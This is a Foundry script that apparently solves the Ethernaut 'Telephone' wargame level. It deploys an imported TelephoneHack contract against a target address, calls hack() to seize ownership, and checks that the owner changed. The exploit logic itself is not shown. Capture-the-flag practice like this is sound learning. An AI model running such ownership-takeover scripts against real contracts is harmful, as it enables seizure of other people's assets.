// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import "forge-std/Script.sol";
import "../src/Telephone/Telephone.sol";
import "../src/Telephone/TelephoneHack.sol";

contract TelephoneScript is Script {
    function run() public {
        address telephoneAddress = vm.envAddress("TELEPHONE_ADDRESS");
        Telephone ethernautTelephone = Telephone(payable(telephoneAddress));

        uint256 deployerKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerKey);

        TelephoneHack telephoneHack = new TelephoneHack(address(ethernautTelephone));
        telephoneHack.hack();

        require(ethernautTelephone.owner() != tx.origin, "contract ownership not changed");

        vm.stopBroadcast();
        console.log("SUCCESS");
    }
}